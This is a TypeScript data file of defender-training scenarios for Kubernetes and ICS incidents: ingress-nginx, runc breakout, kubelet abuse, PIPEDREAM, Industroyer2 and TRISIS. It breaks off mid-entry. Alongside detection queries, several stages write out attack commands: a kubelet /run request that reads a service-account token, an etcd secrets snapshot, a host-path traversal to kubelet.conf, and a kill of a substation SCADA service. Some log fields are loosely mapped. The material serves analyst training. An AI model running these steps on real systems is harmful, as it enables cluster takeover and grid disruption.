import { LegacyDraftScenario } from './normalize-legacy-draft-scenario';

export const OFFICIAL_BATCH5_SPECIALIZED_CATEGORIES_SCENARIOS: LegacyDraftScenario[] = [
  // ============================================================================
  // CATEGORY 1: CONTAINERS_KUBERNETES (Containers, Kubernetes & Service Mesh)
  // ============================================================================
  {
    id: 'k8s-ingress-nginx-admission-webhook-audit-cve-2025-1974',
    title: 'Kubernetes Official Advisory, Wiz & CISA KEV — Ingress-NGINX Admission Controller Configuration Validation Audit (CVE-2025-1974)',
    category: 'CONTAINERS_KUBERNETES',
    mitreId: 'T1190',
    description:
      'Grounded in the official Kubernetes Security Response Committee advisory for CVE-2025-1974, Wiz Research, and CISA KEV guidance: security analysts investigate AdmissionReview requests sent to the ingress-nginx admission webhook (:8443) and correlate nginx -t configuration validation events, Linux /proc/<pid>/fd/ file-descriptor telemetry, and Kubernetes API Server audit logs for cluster-scoped Secret reads.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Cluster Network Client', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Admission Webhook (:8443)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'ingress-nginx-controller Pod', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'K8s Audit & Falco eBPF Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'kube-apiserver Secrets API', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: AdmissionReview Webhook Request & Temporary Buffered Body Allocation',
        narration:
          'The ingress-nginx admission controller listens on TCP port 8443 for Kubernetes AdmissionReview JSON requests. When a large HTTP request body arrives, NGINX buffers the payload into a temporary file under /tmp/nginx/client-body/ while keeping an open file descriptor under /proc/<pid>/fd/.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'kubectl get validatingwebhookconfigurations ingress-nginx-admission -o yaml',
          'ls -l /proc/$(pgrep nginx)/fd/ | grep client-body',
        ],
        defenseMitigation:
          'Upgrade ingress-nginx to v1.12.1 or v1.11.5+, restrict network access to port 8443 using Kubernetes NetworkPolicies so only kube-apiserver can reach the admission webhook, and disable the admission webhook if unused.',
        logs: [
          {
            id: 'k8s-cve1974-1',
            timestamp: '09:10:12.104',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 257,
            ProcessName: 'nginx',
            CommandLine: 'nginx: worker process buffering request body /tmp/nginx/client-body/0000000001',
            raw: 'type=SYSCALL msg=audit(1763284212.104:401): arch=c000003e syscall=257 success=yes a1="/tmp/nginx/client-body/0000000001" comm="nginx" exe="/usr/bin/nginx"',
            parsedFields: {
              WebhookEndpoint: 'https://ingress-nginx-controller-admission.ingress-nginx.svc:443/networking/v1/ingresses',
              BufferedFileDescriptor: '/proc/29/fd/18 -> /tmp/nginx/client-body/0000000001 (deleted)',
              AdvisoryId: 'CVE-2025-1974',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: NGINX Configuration Test (nginx -t) Engine Directive Evaluation',
        narration:
          'To validate the proposed Ingress object, the controller renders a temporary nginx.conf template and invokes /usr/bin/nginx -t. If untrusted annotation fields are interpolated into the template, OpenSSL engine directives are evaluated during the syntax check phase.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1609 - Container Administration Command)',
        technicalCommands: [
          '/usr/bin/nginx -c /tmp/nginx-cfg384912041 -t',
          'ausearch -k container_shared_lib_load -m SYSCALL -sv yes',
        ],
        defenseMitigation:
          'Deploy runtime eBPF rules (Falco or Tetragon) alerting whenever /usr/bin/nginx -t loads shared objects from /proc/*/fd/* or /tmp/* paths.',
        logs: [
          {
            id: 'k8s-cve1974-2',
            timestamp: '09:10:12.480',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'nginx',
            CommandLine: '/usr/bin/nginx -c /tmp/nginx-cfg384912041 -t',
            raw: 'type=SYSCALL msg=audit(1763284212.480:402): arch=c000003e syscall=59 success=yes exe="/usr/bin/nginx" comm="nginx" cmd="/usr/bin/nginx -c /tmp/nginx-cfg384912041 -t"',
            parsedFields: {
              ParentProcess: 'nginx-ingress-controller',
              ChildCommand: '/usr/bin/nginx -c /tmp/nginx-cfg384912041 -t',
              FalcoRuleTriggered: 'Unexpected Shared Object Loaded from ProcFS FD Path',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: ServiceAccount Token Usage & Cluster-Wide Secret Enumeration Audit',
        narration:
          'Because the default ingress-nginx ServiceAccount holds RBAC permissions to list and read Secrets across all namespaces (used for TLS termination certificates), Kubernetes audit logs record get/list requests from system:serviceaccount:ingress-nginx:ingress-nginx against /api/v1/secrets.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.007 - Unsecured Credentials: Container API)',
        technicalCommands: [
          'kubectl auth can-i --list --as=system:serviceaccount:ingress-nginx:ingress-nginx',
          'jq \'. | select(.objectRef.resource=="secrets" and .user.username=="system:serviceaccount:ingress-nginx:ingress-nginx")\' /var/log/kubernetes/audit.log',
        ],
        defenseMitigation:
          'Scope ingress-nginx RBAC RoleBindings to specific namespaces rather than cluster-wide ClusterRoleBindings where possible, and monitor Kubernetes Audit logs for bulk Secret list calls.',
        logs: [
          {
            id: 'k8s-cve1974-3',
            timestamp: '09:10:14.015',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'kube-apiserver',
            CommandLine: 'kubectl get secrets --all-namespaces -o json',
            raw: 'k8s_audit: {"kind":"Event","stage":"ResponseComplete","verb":"list","user":{"username":"system:serviceaccount:ingress-nginx:ingress-nginx"},"objectRef":{"resource":"secrets"},"responseStatus":{"code":200}}',
            parsedFields: {
              K8sAuditVerb: 'list',
              PrincipalIdentity: 'system:serviceaccount:ingress-nginx:ingress-nginx',
              TargetResource: '/api/v1/secrets (All Namespaces)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'runc-leaky-vessels-cwd-fd-escape-cve-2024-21626',
    title: 'OpenContainers Security Advisory, Snyk & CISA KEV — runc File Descriptor Leak & Host Filesystem Breakout Analysis (CVE-2024-21626)',
    category: 'CONTAINERS_KUBERNETES',
    mitreId: 'T1611',
    description:
      'Grounded in the OpenContainers runc security advisory (GHSA-xr7r-f8xq-vfvv / CVE-2024-21626), Snyk Leaky Vessels research, and CISA KEV guidance: DFIR analysts investigate container breakout attempts caused by leaked open file descriptors pointing to the host /sys/fs/cgroup directory during runc exec or container initialization with a /proc/self/fd/<N> WORKDIR.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Container Runtime Spec (config.json)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'runc Init Process (runc:[2:INIT])', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Leaked Host FD (/proc/self/fd/7)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Linux auditd & Tetragon eBPF', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Worker Node Root FS (/)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Open /sys/fs/cgroup File Descriptor Persistence Across chdir() in runc Init',
        narration:
          'In vulnerable versions of runc (<= 1.1.11), an internal file descriptor opened on the host /sys/fs/cgroup hierarchy was not closed with O_CLOEXEC before chdir(cwd) was called inside the container namespace, allowing a process with cwd set to /proc/self/fd/7 to hold a reference to the host mount namespace.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Escape to Host (T1611 - Escape to Host)',
        technicalCommands: [
          'runc --version',
          'ls -la /proc/self/fd/7',
        ],
        defenseMitigation:
          'Upgrade runc to v1.1.12 or later (which enforces O_CLOEXEC and verifies that the working directory resides inside the container rootfs after pivot_root).',
        logs: [
          {
            id: 'runc-21626-1',
            timestamp: '10:15:02.310',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 80,
            ProcessName: 'runc',
            CommandLine: 'runc init (chdir /proc/self/fd/7)',
            raw: 'type=SYSCALL msg=audit(1763288102.310:512): arch=c000003e syscall=80 success=yes a0="/proc/self/fd/7" comm="runc:[2:INIT]" exe="/usr/bin/runc"',
            parsedFields: {
              SyscallName: 'sys_chdir (80)',
              WorkingDirectory: '/proc/self/fd/7 (Host /sys/fs/cgroup reference)',
              VulnerabilityId: 'CVE-2024-21626',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Relative Path Traversal Across Host Mount Namespace (../../../../)',
        narration:
          'Once the container process starts with its current working directory anchored to the host cgroup directory, relative path traversal (../../../../etc/shadow or /proc/<host_pid>/root) reaches the underlying Kubernetes worker node filesystem outside the container pivot_root boundary.',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Privilege Escalation (T1611 - Escape to Host)',
        technicalCommands: [
          'stat ../../../../etc/hostname',
          'ausearch -m PATH -ts recent | grep "/sys/fs/cgroup/../../../.."',
        ],
        defenseMitigation:
          'Enforce Kubernetes Pod Security Standards (Restricted profile), use read-only root filesystems, and monitor openat2 (RESOLVE_IN_ROOT) violations via eBPF.',
        logs: [
          {
            id: 'runc-21626-2',
            timestamp: '10:15:03.118',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 257,
            ProcessName: 'sh',
            CommandLine: 'cat ../../../../etc/kubernetes/kubelet.conf',
            raw: 'type=SYSCALL msg=audit(1763288103.118:515): arch=c000003e syscall=257 success=yes name="../../../../etc/kubernetes/kubelet.conf" comm="sh" exe="/bin/sh"',
            parsedFields: {
              AccessedHostPath: '/etc/kubernetes/kubelet.conf',
              ContainerTraversalPath: '/proc/self/fd/7/../../../../etc/kubernetes/kubelet.conf',
              DetectionEngine: 'Tetragon eBPF Mount Namespace Mismatch Alert',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Host Node Kubelet Credential & Systemd Unit Persistence Audit',
        narration:
          'With read/write access to the worker node root filesystem, the escaped process inspects /etc/kubernetes/kubelet.conf and /var/lib/kubelet/pki/kubelet-client-current.pem, which defenders detect by correlating host auditd file-access records against container cgroup IDs.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.001 - Credentials In Files)',
        technicalCommands: [
          'ausearch -f /etc/kubernetes/kubelet.conf -i',
          'systemctl status kubelet containerd',
        ],
        defenseMitigation:
          'Configure auditd rules on /etc/kubernetes/ and /var/lib/kubelet/pki/ to alert on any access originating from a non-host cgroup namespace.',
        logs: [
          {
            id: 'runc-21626-3',
            timestamp: '10:15:05.902',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 257,
            ProcessName: 'sh',
            CommandLine: 'grep client-certificate /etc/kubernetes/kubelet.conf',
            raw: 'type=PATH msg=audit(1763288105.902:520): item=0 name="/etc/kubernetes/kubelet.conf" inode=1048592 dev=08:01 mode=0100600 ouid=0 ogid=0',
            parsedFields: {
              TargetFile: '/etc/kubernetes/kubelet.conf',
              CgroupContext: '/kubepods.slice/kubepods-burstable.slice',
              AuditRuleKey: 'k8s_node_credential_read',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'k8s-kubelet-anonymous-api-etcd-snapshot-forensics',
    title: 'CNCF Kubernetes Security, Microsoft Defender for Cloud & MITRE T1609 — Kubelet Read/Write Port 10250 & etcd Snapshot Forensics',
    category: 'CONTAINERS_KUBERNETES',
    mitreId: 'T1609',
    description:
      'Grounded in official Kubernetes Kubelet authentication/authorization documentation, Microsoft Defender for Cloud threat research, and MITRE ATT&CK Containers (T1609 / T1552.007): incident responders investigate misconfigured Kubelet API endpoints (--anonymous-auth=true / --authorization-mode=AlwaysAllow on TCP port 10250) and correlate container command execution (/run) with direct etcd database snapshot reads.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Internal Pod / Node Scanner', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Kubelet HTTPS API (:10250)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Container Runtime (containerd)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Kubelet Journald & Audit Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'etcd Key-Value Store (:2379)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Pod Enumeration via Kubelet /pods Endpoint (:10250)',
        narration:
          'When Kubelet runs with --anonymous-auth=true and --authorization-mode=AlwaysAllow, any pod or host on the node network can query https://<node_ip>:10250/pods to retrieve full PodSpecs, environment variables, and mounted volume paths running on that worker node.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Discovery (T1613 - Container and Resource Discovery)',
        technicalCommands: [
          'curl -sk https://10.10.20.11:10250/pods | jq ".items[].metadata.name"',
          'ps aux | grep kubelet | grep -- "--anonymous-auth"',
        ],
        defenseMitigation:
          'Set --anonymous-auth=false and --authorization-mode=Webhook in /var/lib/kubelet/config.yaml across all worker nodes and block port 10250 from pod CIDR ranges.',
        logs: [
          {
            id: 'k8s-kubelet-1',
            timestamp: '11:02:11.045',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 10250,
            ProcessName: 'kubelet',
            CommandLine: 'GET /pods HTTP/1.1 (Kubelet API Port 10250 Anonymous Request)',
            raw: 'kubelet[1420]: I1116 11:02:11.045112 server.go:462] "GET /pods"Resp=200 RemoteAddr="10.244.1.18:49210" User="system:anonymous"',
            parsedFields: {
              KubeletEndpoint: 'GET /pods (:10250)',
              AuthenticatedUser: 'system:anonymous',
              AuthorizationMode: 'AlwaysAllow (Misconfigured)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Remote Command Execution Inside Privileged Pod via Kubelet /run Endpoint',
        narration:
          'Using the pod namespace, pod name, and container name discovered from /pods, a POST request to /run/<namespace>/<pod>/<container> instructs Kubelet to invoke the CRI ExecSync RPC on containerd, executing arbitrary commands inside a privileged kube-system pod.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1609 - Container Administration Command)',
        technicalCommands: [
          'curl -sk -X POST "https://10.10.20.11:10250/run/kube-system/kube-proxy-x892a/kube-proxy" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"',
        ],
        defenseMitigation:
          'Monitor kubelet journald logs and CRI containerd events for /run or /exec requests that do not originate from the control-plane kube-apiserver IP.',
        logs: [
          {
            id: 'k8s-kubelet-2',
            timestamp: '11:02:18.610',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'containerd-shim',
            CommandLine: 'POST /run/kube-system/kube-proxy-x892a/kube-proxy cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token',
            raw: 'kubelet[1420]: I1116 11:02:18.610982 server.go:462] "POST /run/kube-system/kube-proxy-x892a/kube-proxy" Resp=200 RemoteAddr="10.244.1.18:49214"',
            parsedFields: {
              KubeletApiAction: 'POST /run/kube-system/kube-proxy-x892a/kube-proxy',
              TargetNamespace: 'kube-system',
              CriOperation: 'ExecSync via containerd-shim-runc-v2',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Control-Plane etcd Snapshot Extraction (/var/lib/etcd/member/snap/db)',
        narration:
          'If the compromised node hosts control-plane static pods or mounts /etc/kubernetes/pki/etcd, etcdctl snapshot save dumps the entire cluster state database (/registry/secrets/*), which DFIR analysts verify in etcd gRPC access logs and auditd file reads.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.007 - Unsecured Credentials: Container API)',
        technicalCommands: [
          'ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key snapshot save /tmp/etcd-snapshot.db',
        ],
        defenseMitigation:
          'Enable Kubernetes EncryptionConfiguration (AES-CBC or KMS v2) at rest for Secrets stored in etcd so offline snapshots of /var/lib/etcd/member/snap/db do not expose plaintext credentials.',
        logs: [
          {
            id: 'k8s-kubelet-3',
            timestamp: '11:02:29.402',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 2379,
            ProcessName: 'etcdctl',
            CommandLine: 'etcdctl --endpoints=https://127.0.0.1:2379 snapshot save /tmp/etcd-snapshot.db',
            raw: 'type=SYSCALL msg=audit(1763290949.402:608): arch=c000003e syscall=59 success=yes exe="/usr/local/bin/etcdctl" comm="etcdctl" key="etcd_snapshot_dump"',
            parsedFields: {
              DatabaseTarget: 'etcd (:2379) /var/lib/etcd/member/snap/db',
              OutputArtifact: '/tmp/etcd-snapshot.db',
              KeyPrefixTargeted: '/registry/secrets/kube-system/',
            },
          },
        ],
      },
    ],
  },

  // ============================================================================
  // CATEGORY 2: ICS_OT_SCADA (ICS, OT & Industrial SCADA Grid)
  // ============================================================================
  {
    id: 'ics-pipedream-incontroller-codesys-modbus-opcua',
    title: 'CISA AA22-103A, Dragos PIPEDREAM & Mandiant INCONTROLLER — Industrial PLC CODESYS & Modbus/OPC-UA Protocol Forensics',
    category: 'ICS_OT_SCADA',
    mitreId: 'T1046',
    description:
      'Grounded in Joint Cybersecurity Advisory AA22-103A (CISA, NSA, FBI, DOE), Dragos PIPEDREAM analysis, and Mandiant INCONTROLLER research: OT security analysts investigate modular ICS frameworks (TAGRUN, CODECALL, OMWORM) interacting with industrial Programmable Logic Controllers (PLCs) over OPC-UA (TCP 4840), Modbus TCP (TCP 502), and CODESYS Gateway protocols.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Compromised Engineering WS', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Purdue Level 3/2 OT Firewall', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Schneider / Omron PLC (Level 1)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Zeek ICS & Nozomi/Dragos NDR', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'OPC-UA Server & Historian', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Industrial Asset Discovery via OPC-UA (Port 4840) & ENIP/Modbus Enumeration (TAGRUN)',
        narration:
          'From a compromised Level 2/3 Engineering Workstation, the TAGRUN module enumerates OPC-UA servers on TCP port 4840 (OpenSecureChannel / CreateSession / Browse) and scans industrial subnets on UDP/TCP 44818 (EtherNet/IP ListIdentity) and TCP 502 (Modbus Device ID 0x2B/0x0E) to inventory PLC models and firmware versions.',
        activeNodes: ['attacker', 'firewall', 'ad', 'siem'],
        mitreTactic: 'Discovery (T1046 - Network Service Discovery / ICS Asset Enumeration)',
        technicalCommands: [
          'zeek -C -r ot-capture.pcap icsnpp-opcua-binary icsnpp-modbus',
          'python3 tagrun_discovery.py --opcua-endpoint opc.tcp://10.50.10.20:4840 --browse-nodes',
        ],
        defenseMitigation:
          'Enforce Purdue Model network segmentation between IT (Level 4), DMZ (Level 3.5), and OT Control Zones (Levels 1-2), and require mutual X.509 certificate authentication on OPC-UA endpoints.',
        logs: [
          {
            id: 'ics-pipe-1',
            timestamp: '12:05:10.115',
            source: 'Network',
            severity: 'high',
            EventCode: 4840,
            ProcessName: 'python3.exe',
            CommandLine: 'python3 tagrun_discovery.py --opcua-endpoint opc.tcp://10.50.10.20:4840 --browse-nodes',
            raw: 'zeek_opcua_binary: ts=1763294710.115 orig_h=10.50.30.12 resp_h=10.50.10.20 resp_p=4840 msg_type="OPN" service="GetEndpointsRequest" security_mode="None"',
            parsedFields: {
              IndustrialProtocol: 'OPC-UA Binary (TCP 4840)',
              ServiceInvoked: 'GetEndpointsRequest / BrowseRequest',
              AdvisoryReference: 'CISA AA22-103A (APT Tools Targeting ICS/SCADA)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: CODESYS v2/v3 Runtime Authentication Bypass & Logic Upload Inspection (CODECALL)',
        narration:
          'The CODECALL module targets the CODESYS Runtime Toolkit on TCP port 1217/2455, crafting Layer 4 block driver frames to enumerate PLC device parameters and attempt unauthorized IEC 61131-3 control logic transfers.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Lateral Movement (T1021 - Remote Services / CODESYS Gateway Protocol)',
        technicalCommands: [
          'suricata -c /etc/suricata/suricata.yaml -r ot-substation.pcap',
          'zeek-cut id.orig_h id.resp_h function pdu_type < codesys.log',
        ],
        defenseMitigation:
          'Enable mandatory user management and X.509 signed project downloads in CODESYS Runtime v3.5+, and alert on any PLC program download or stop command outside scheduled maintenance windows.',
        logs: [
          {
            id: 'ics-pipe-2',
            timestamp: '12:05:44.820',
            source: 'IDS Alert',
            severity: 'critical',
            EventCode: 2455,
            ProcessName: 'codesys_client',
            CommandLine: 'CODESYS Gateway TCP/2455 ServiceGroup=0x0002 (CmpApp) SubCommand=Login/DownloadApplication',
            raw: 'ot_ndr_alert: signature="CISA-AA22-103A CODECALL CODESYS Runtime Command" src=10.50.30.12 dst=10.50.10.45 dst_port=2455 service_group=0x0002',
            parsedFields: {
              TargetPlcRuntime: 'CODESYS Control Runtime (TCP 2455)',
              ServiceGroup: '0x0002 (CmpApp Application Manager)',
              NdrSignature: 'CISA-AA22-103A CODECALL Activity',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Direct Modbus TCP Register Write (Function Code 06/16) & Physical Switch Verification',
        narration:
          'At the Modbus TCP layer (port 502), unauthorized Function Code 06 (Write Single Register) or Function Code 16 (Write Multiple Registers) PDUs modify holding registers controlling actuator setpoints, which CISA ICS-NPP Zeek parsers log in modbus.log.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1565.002 - Data Manipulation: Transmitted Data / PLC Register Write)',
        technicalCommands: [
          'zeek -C -r modbus-traffic.pcap icsnpp-modbus',
          'jq \'select(.func=="WRITE_SINGLE_REGISTER" or .func=="WRITE_MULTIPLE_REGISTERS")\' modbus.log',
        ],
        defenseMitigation:
          'Place physical PLC keyswitches in RUN (hard-locked) mode rather than REMOTE/PROGRAM mode so remote network commands cannot overwrite ladder logic, and deploy CISA ICSNPP-Modbus deep packet inspection.',
        logs: [
          {
            id: 'ics-pipe-3',
            timestamp: '12:06:12.004',
            source: 'Network',
            severity: 'critical',
            EventCode: 502,
            ProcessName: 'zeek-icsnpp',
            CommandLine: 'Modbus TCP UnitID=1 FunctionCode=16 (Write Multiple Holding Registers) Address=40001',
            raw: 'zeek_modbus: ts=1763294772.004 uid=Cmod91 orig_h=10.50.30.12 resp_h=10.50.10.45 resp_p=502 unit_id=1 func="WRITE_MULTIPLE_REGISTERS" address=40001 quantity=4',
            parsedFields: {
              Protocol: 'Modbus TCP (Port 502 · CISA ICSNPP-Modbus)',
              ModbusFunction: 'Function Code 16 (0x10 - Write Multiple Registers)',
              TargetRegisterRange: 'Holding Registers 40001 - 40004',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'ics-industroyer2-iec-60870-5-104-substation-telemetry',
    title: 'CERT-UA #4435, ESET & CISA ICS — Industroyer2 IEC 60870-5-104 Substation Telecontrol & Protection Relay Forensics',
    category: 'ICS_OT_SCADA',
    mitreId: 'T1489',
    description:
      'Grounded in CERT-UA Advisory #4435, ESET Industroyer2 technical analysis, and CISA ICS guidance: forensic investigators analyze an automated ICS binary communicating over IEC 60870-5-104 (TCP port 2404) with electrical substation RTUs and protection relays using ASDU Type 45 (Single Command) and Type 46 (Double Command) Information Object Addresses (IOAs).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'SCADA HMI Server (108_100.exe)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Substation Gateway (:2404)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Substation RTU & Bay Controller', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'OT Packet Broker & Sysmon', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'PServiceControl Legitimate Service', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Legitimate SCADA Service Termination (PServiceControl.exe) Prior to Port 2404 Takeover',
        narration:
          'Before opening its own IEC-104 socket connections, the Industroyer2 executable terminates the legitimate substation telecontrol service (PServiceControl.exe) and renames its binary on disk so the legitimate SCADA master cannot override the rogue commands.',
        activeNodes: ['attacker', 'ad', 'siem'],
        mitreTactic: 'Impact (T1489 - Service Stop)',
        technicalCommands: [
          'taskkill.exe /F /IM PServiceControl.exe',
          'cmd.exe /c move C:\\SCADA\\bin\\PServiceControl.exe C:\\SCADA\\bin\\PServiceControl.exe.bak',
        ],
        defenseMitigation:
          'Enforce Windows AppLocker / WDAC rules on SCADA HMI servers and alert immediately on termination or renaming of operational telecontrol binaries.',
        logs: [
          {
            id: 'ics-ind2-1',
            timestamp: '16:00:01.120',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: '108_100.exe',
            CommandLine: 'taskkill.exe /F /IM PServiceControl.exe',
            raw: 'EventID=1 Image="C:\\Windows\\System32\\taskkill.exe" CommandLine="taskkill.exe /F /IM PServiceControl.exe" ParentImage="C:\\Temp\\108_100.exe"',
            parsedFields: {
              ParentBinary: 'C:\\Temp\\108_100.exe (Industroyer2 Binary)',
              StoppedServiceBinary: 'PServiceControl.exe (Substation SCADA Service)',
              CertUaReference: 'CERT-UA#4435',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: IEC 60870-5-104 STARTDT_ACT Handshake & Interrogation Frame on TCP Port 2404',
        narration:
          'The binary reads its embedded configuration table (containing target RTU IP addresses, Common Address of ASDU, and IOA lists) and sends an IEC-104 U-format STARTDT_ACT (0x68 0x04 0x07 0x00 0x00 0x00) control frame over TCP port 2404 to activate data transfer with each substation RTU.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Command and Control (T1071 - Application Layer Protocol / IEC 60870-5-104)',
        technicalCommands: [
          'tshark -r substation.pcap -Y "iec60870_104" -T fields -e ip.src -e ip.dst -e iec60870_104.type -e iec60870_104.utype',
        ],
        defenseMitigation:
          'Deploy IEC 62351 TLS encryption and MAC authentication for IEC 60870-5-104 links, and restrict TCP port 2404 sessions to hardware-bound SCADA master interfaces.',
        logs: [
          {
            id: 'ics-ind2-2',
            timestamp: '16:00:02.450',
            source: 'Network',
            severity: 'high',
            EventCode: 2404,
            ProcessName: '108_100.exe',
            CommandLine: 'IEC 60870-5-104 U-Frame STARTDT_ACT (0x07) -> RTU 10.60.12.10:2404',
            raw: 'zeek_iec104: ts=1763308802.450 orig_h=10.60.1.50 resp_h=10.60.12.10 resp_p=2404 apci_type="U_FORMAT" u_func="STARTDT_ACT" asdu_type=100 cause_tx="ACTIVATION"',
            parsedFields: {
              Protocol: 'IEC 60870-5-104 (TCP 2404)',
              ApciControlFrame: 'STARTDT_ACT (Start Data Transfer Activation)',
              AsduType100: 'C_IC_NA_1 (Interrogation Command)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: ASDU Type 46 (C_DC_NA_1 Double Command) IOA Telecontrol Frame Audit',
        narration:
          'After receiving STARTDT_CON, the binary iterates through its configured Information Object Addresses (IOAs) and transmits ASDU Type 45 (C_SC_NA_1 Single Command) and Type 46 (C_DC_NA_1 Double Command) frames with Cause of Transmission = 6 (Activation) to toggle telecontrol state points.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Impact (T1565.002 - Transmitted Data Manipulation / IEC-104 Telecontrol)',
        technicalCommands: [
          'tshark -r substation.pcap -Y "iec60870_asdu.typeid == 45 || iec60870_asdu.typeid == 46" -T fields -e iec60870_asdu.ca -e iec60870_asdu.ioa',
        ],
        defenseMitigation:
          'Implement OT protocol anomaly detection that alerts on rapid sequential bursts of ASDU Type 45/46 commands across multiple IOAs without preceding operator Select-Before-Operate (SBO) sequences.',
        logs: [
          {
            id: 'ics-ind2-3',
            timestamp: '16:00:04.890',
            source: 'IDS Alert',
            severity: 'critical',
            EventCode: 46,
            ProcessName: 'suricata-ics',
            CommandLine: 'IEC-104 ASDU Type 46 (C_DC_NA_1 Double Command) COA=12 IOA=1104COT=6 (Activation)',
            raw: 'zeek_iec104_asdu: orig_h=10.60.1.50 resp_h=10.60.12.10 type_id=46 type_name="C_DC_NA_1" cot=6 common_addr=12 ioa=1104 dco_state="OFF"',
            parsedFields: {
              AsduTypeId: '46 (C_DC_NA_1 - Double Command)',
              CauseOfTransmission: '6 (Activation)',
              InformationObjectAddress: 'COA=12, IOA=1104',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'ics-trisis-triton-schneider-triconex-sis-telemetry',
    title: 'CISA ICS-ALERT-17-356-01, Mandiant & Dragos — TRISIS / TRITON Safety Instrumented System (SIS) TriStation Protocol Forensics',
    category: 'ICS_OT_SCADA',
    mitreId: 'T1542',
    description:
      'Grounded in CISA ICS-ALERT-17-356-01, Mandiant TRITON analysis, and Dragos TRISIS documentation: OT forensic specialists analyze a masqueraded Python/Py2EXE binary (trilog.exe) on a Safety Instrumented System (SIS) engineering workstation communicating over the UDP port 1502 TriStation protocol with Schneider Electric Triconex safety controllers.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'SIS Engineering WS (trilog.exe)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'UDP 1502 TriStation Link', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Triconex SIS Controller (MPC860)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'OT Network Tap & Host EDR', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Physical Keyswitch (PROGRAM Mode)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Masqueraded Py2EXE Binary (trilog.exe) & Library.zip Extraction on SIS Workstation',
        narration:
